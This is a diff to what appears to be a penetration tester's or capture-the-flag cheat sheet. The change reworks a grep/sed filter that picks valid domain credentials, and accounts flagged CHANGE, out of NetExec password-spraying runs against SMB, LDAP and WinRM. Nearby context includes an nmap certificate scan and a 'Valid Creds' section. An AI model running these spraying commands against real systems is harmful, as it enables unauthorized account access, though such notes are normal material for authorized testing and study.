@@ -146,7 +146,7 @@ cat passwords | sort -u | tee passwords
 (nxc smb "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
 (nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
 (nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
+) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m'
 
 ## Web
 nmap $TARGET --script "ssl-cert" --open -p 443
@@ -189,7 +189,7 @@ unzip backup.zip -d .
 (nxc smb "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
 (nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
 (nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
+) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m'
 
 ## Valid Creds
 sudo skewme $TARGET
